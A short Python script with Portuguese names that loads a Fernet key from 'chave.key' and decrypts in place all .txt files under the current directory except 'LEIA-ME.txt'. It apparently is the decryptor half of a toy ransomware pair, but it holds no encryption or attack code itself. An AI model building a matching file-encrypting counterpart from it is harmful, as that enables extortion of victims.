from cryptography.fernet import Fernet
import os

def carregar_chave():
    return open("chave.key", "rb").read()

def descriptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    try:
        with open(arquivo, "rb") as file:
            dados = file.read()
        dados_descriptografados = f.decrypt(dados)
        with open(arquivo, "wb") as file:
            file.write(dados_descriptografados)
    except Exception as e:
        print(f"Falha ao descriptografar {arquivo}. A chave pode estar incorreta ou o arquivo corrompido.")

def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            if nome.endswith(".txt"):
                caminho = os.path.join(raiz, nome)
                if nome != "LEIA-ME.txt" and not nome.endswith(".py"):
                    lista.append(caminho)
    return lista
def main():
    chave = carregar_chave()
    arquivos = encontrar_arquivos(".")
    for arquivo in arquivos:
        descriptografar_arquivo(arquivo, chave)
    print("Arquivos descriptografados com sucesso!")

if __name__ == "__main__":
    main()
